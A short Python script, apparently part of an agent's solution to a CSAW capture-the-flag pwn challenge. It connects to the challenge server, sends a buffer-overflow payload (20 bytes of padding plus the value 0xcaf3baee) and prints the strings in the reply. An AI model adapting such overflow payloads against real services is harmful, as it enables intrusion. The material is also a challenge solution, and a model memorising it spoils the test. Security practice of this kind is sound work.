import socket
import struct
import string

def extract_printable(data):
    """Extract printable ASCII strings from binary data"""
    result = ""
    current_string = ""
    for byte in data:
        if chr(byte) in string.printable:
            current_string += chr(byte)
        else:
            if len(current_string) > 4:  # Only keep reasonably long strings
                result += current_string + "\n"
            current_string = ""
    if len(current_string) > 4:
        result += current_string
    return result

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('pwn.chal.csaw.io', 1436))
s.recv(1024)  # Receive initial message

# Send payload: 20 bytes padding + 0xcaf3baee in little-endian
payload = b'A' * 20 + struct.pack('<I', 0xcaf3baee)
s.send(payload)

# Receive response with timeout
s.settimeout(2)
try:
    response = s.recv(1024)
    print("Raw response length:", len(response))
    print("Printable strings in response:")
    print(extract_printable(response))
except Exception as e:
    print("Error:", e)
finally:
    s.close()
end_of_edit

